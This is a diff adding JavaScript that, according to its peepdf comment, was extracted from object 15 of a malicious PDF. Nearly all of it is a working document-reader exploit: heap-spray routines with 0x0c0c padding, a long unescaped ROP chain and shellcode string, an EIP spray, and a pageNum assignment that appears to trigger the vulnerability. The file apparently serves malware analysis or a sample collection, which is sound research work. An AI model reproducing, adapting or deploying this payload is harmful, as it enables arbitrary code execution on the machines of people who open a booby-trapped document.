@@ -1,0 +1,57 @@
+// peepdf comment: Javascript code located in object 15 (version 0)
+
+var padding;
+var bbb, ccc, ddd, eee, fff, ggg, hhh;
+var pointers_a, i;
+var x = new Array();
+var y = new Array();
+
+function alloc(bytes) {
+    return padding.substr(0, (bytes - 6) / 2);
+}
+
+function spray_eip(esc_a) {
+    pointers_a = unescape(esc_a);
+    for (i = 0; i < 2000; i++) {
+        x[i] = alloc(0x8) + pointers_a;
+        y[i] = alloc(0x88) + pointers_a;
+        y[i] = alloc(0x88) + pointers_a;
+        y[i] = alloc(0x88) + pointers_a;
+    }
+};
+
+function spray_shellcode() {
+    bbb = unescape('%u0323%u4a18%u0c0c%u0c0c%u0c0c%u0c0c%u6f29%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u6f29%u4a80%u6cef%u4a80%u79e6%ue5df%u79e6%ue5df%u79e6%ue5df%u79e6%ue5df%u0000%u0000%u0002%u0000%u0102%u0000%u6f29%u4a80%ue9c9%u1a30%ue9c9%u1a30%ue9c9%u1a30%ue9c9%u1a30%ue9c9%u1a30%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%u63a5%u4a80%u63bb%u380d%u63bb%u380d%u63bb%u380d%u63bb%u380d%u63bb%u380d%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u0000%u0000%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%u3148%u48c9%ue981%uffc0%uffff%u8d48%uef05%uffff%u48ff%uc4bb%uc70f%u8825%ua8b6%u488c%u5831%u4827%uf82d%uffff%ue2ff%u38f4%u4447%u78c1%u685e%uc48c%u860f%uc974%ufae6%u92dd%uf647%uedf7%u23fe%ua4de%u4c47%u9077%u23fe%ue4de%u4c47%ud857%ua7fe%u8e3b%u8a45%u4114%u99fe%u684c%ua633%u8a59%u889a%u05cd%ucac6%u8964%u4a77%u9661%u964e%u036d%u88e4%u8607%u8f33%u5824%u283d%uc404%uc70f%u0d6d%udc76%u8ceb%u170e%u0375%ub0fe%u4fc8%ue74f%u896c%u4b66%u8cda%u0ef0%u0364%u2082%uc5c4%u8ad9%u4114%u99fe%u684c%u064e%u85ec%ua9f7%ufc4d%ub2ef%uc4d4%ue4b5%ucca8%ufe4a%ufdf4%uf06e%u4fc8%ue34f%u896c%uce66%u4fcd%u8f03%u0361%ub4f6%uc5c5%u86df%u8cae%ue03e%u148d%u9f4e%ud064%uf1e8%u85d6%u8657%uc97c%ue0ec%u280f%u862f%u7777%uf056%u9dcd%u8f55%u9aae%uff5f%u3b73%u9af0%u366c%udbc1%u9bbe%uf53c%u8825%ufef7%u4dc5%u8fe9%u64a4%ua916%uc48c%u4e46%uc1c0%uaa0a%uc58c%uc7b4%u8825%ue9b6%u8dd8%u2386%u0169%ue947%u8836%ue178%u7722%ue463%u2e05%uc667%u8824%uf1b6%u7ecd%u4726%u884e%u7d49%u94dc%uf642%uc5ec%u6887%u3bc4%u8fcf%u4aac%u57fe%u8c4c%u0686%u3264%ua75c%u2453%u12f0%u016d%uc271%u859c%u8b57%u6aac%u21fe%u8575%u05b5%ubffe%u57d1%u8c59%u153e%u016d%ue94f%u7336%uffe6%u77da%ue563%u04bd%uf647%uc0f7%u513f%u7ecd%u2b7b%u691e%u7d49%u4dc4%u8ff6%u4fac%u12f7%uaaf9%ua642%u5dda%u29fe%u6448%uc70d%uc125%ucb0e%ua0e1%uc70f%u8825%ue9b6%u85dc%u8f5f%u6aac%uffe1%u89db%u073e%u854f%ue9ef%u26dc%ua1f3%ucce2%ufc92%uc58d%u4a47%uac61%u6eae%uac8c%u4e47%udec3%ue9e6%u85dc%u865f%uc175%u6849%u94cd%u3846%uc5ed%u693f%u4dc0%u86ce%uf19f%u977a%u3b0a%u8fda%u5a14%u57fe%u4f46%u8601%u809f%ub531%u3bec%u7cda%u3dd5%ufe14%u7ecd%u52a9%u1598%u7d49%u47c4%uefcb%u8e19%ua2ca%u3f0c%ub2ef%u3320%ubbf1%uabfe%uc765%uc97c%u723f%u1173%uc70f%u8825%ua8b6%u418c');
+    ccc = unescape("%u0c0c");
+    ccc += ccc;
+
+    while (ccc.length + 20 + 8 < (0x8000 + 0x8000)) ccc += ccc;
+
+    i1 = 0x0c0c - 0x24;
+    ddd = ccc.substring(0, i1 / 2);
+
+    ddd += bbb;
+    ddd += ccc;
+
+    i2 = 0x4000 + 0xc000;
+    eee = ddd.substring(0, i2 / 2);
+
+    for (; eee.length < 0x40000 + 0x40000;) eee += eee;
+
+    i3 = (0x1020 - 0x08) / 2;
+    fff = eee.substring(0, 0x80000 - i3);
+
+    ggg = new Array();
+
+    for (hhh = 0; hhh < 0x1e0 + 0x10; hhh++) ggg[hhh] = fff + "s";
+}
+
+padding = unescape("%u6983%ue70e%u6983%ue70e%u6983%ue70e%u53c3%u4a84%u9173%ue3de%u9173%ue3de%u9173%ue3de%u9173%ue3de%u9173%ue3de%u9173%ue3de%u9173%ue3de%u0c0c%u0c0c%u25e9%u2e96%u25e9%u2e96%u25e9%u2e96%u25e9%u2e96%u25e9%u2e96%u25e9%u2e96%u25e9%u2e96%u25e9%u2e96%u25e9%u2e96%u25e9%u2e96%u25e9%u2e96%u25e9%u2e96%u25e9%u2e96%u25e9%u2e96%u25e9%u2e96%u25e9%u2e96");
+while (padding.length < 0x10000)
+padding = padding + padding;
+
+spray_shellcode();
+spray_eip('%u4141');
+
+this.pageNum = 2;
+
